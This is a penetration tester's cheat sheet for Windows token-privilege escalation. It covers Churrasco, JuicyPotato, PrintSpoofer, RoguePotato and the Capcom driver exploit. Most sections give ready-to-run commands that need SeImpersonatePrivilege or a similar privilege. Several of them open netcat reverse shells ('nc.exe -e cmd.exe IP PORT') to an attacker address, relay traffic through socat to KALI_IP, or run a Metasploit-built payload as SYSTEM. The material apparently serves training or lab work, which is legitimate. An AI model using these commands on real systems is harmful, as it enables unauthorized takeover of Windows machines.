# windows token exploits

## Churrasco

```bash
REQUIREMENT: SEImpersonalPrivilege
| Windows XP/VISTA/2003/2008, Win Server 2003

# usage
> churrasco.exe -d "nc.exe -e cmd.exe IP PORT"
```

## HotPotato

```bash
Windows 7,8,10, Server 2008, Server 2012: Try Hot Potato
```

## JuicyPotato.exe \[/opt/juicy-potato-exe]

```bash
REQUIREMENT:
| SeImpersonatePrivilege, SeAssignPrimaryToken, SeCreateGlobalPrivilege, smb-service
| machine is < Windows 10 1809 < Windows Server 2019
CLSID: http://ohpe.it/juicy-potato/CLSID/ | {03ca98d6-ff5d-49b8-abc6-03dd84127020}

# /opt/juicy-potato/CLSID/GetCLSID.ps1
> JuicyPotato.exe -l 1337 -p "c:\windows\system32\cmd.exe" -a "/c PATH\nc.exe -e cmd.exe IP PORT" -t * -c CLSID
> Juicy.Potato.x86.exe -l 1337 -p "c:\users\public\kashz.exe" -t * -c CLSID

> PSExec64.exe -i -u "nt authority\local service" <shell.exe>
```

## [PrintSpoofer.exe](https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0) \[/opt/printspoofer]

```bash
REQUIREMENT
| SeImpersonatePrivilege 
| Win10, WinServer 2016, WinServer 2019

> PrintSpoofer.exe -i -c cmd.exe
> PrintSpoofer.exe -c "nc.exe IP PORT -e cmd.exe"
```

## [RoguePotato ](https://github.com/antonioCoco/RoguePotato)\[/opt/rogue-potato-exe]

```bash
REQUIREMENT:
| SeImpersonatePrivilege
| machine is >= Windows 10 1809 & Windows Server 2019

# socat redirector for OXID resolving, must use 135
$ socat tcp-listen:135,reuseaddr,fork tcp:KALI_IP:9999
> RoguePotato.exe -r KALI_IP -e "PATH\nc.exe IP PORT -e cmd.exe" -l 9999
```

## [SeLoadDriverPrivilege](https://book.hacktricks.xyz/windows/active-directory-methodology/privileged-accounts-and-token-privileges#capcom-sys-driver-exploit)

```bash
# obtain user SID
 | Get-ADUser -Identity 'svc-print' | select SID
 | (New-Object System.Security.Principal.NTAccount("svc-print")).Translate([System.Security.Principal.SecurityIdentifier]).value

# vs-code execution:
https://github.com/tandasat/ExploitCapcom/
# file ExploitCapcom.cpp
# line 410
TCHAR CommandLine[] = TEXT("C:\\Users\\Public\\kashz.exe");
# build solution for release
# generate kashz.exe using msf

# run
.\ExploitCapcom.exe
```
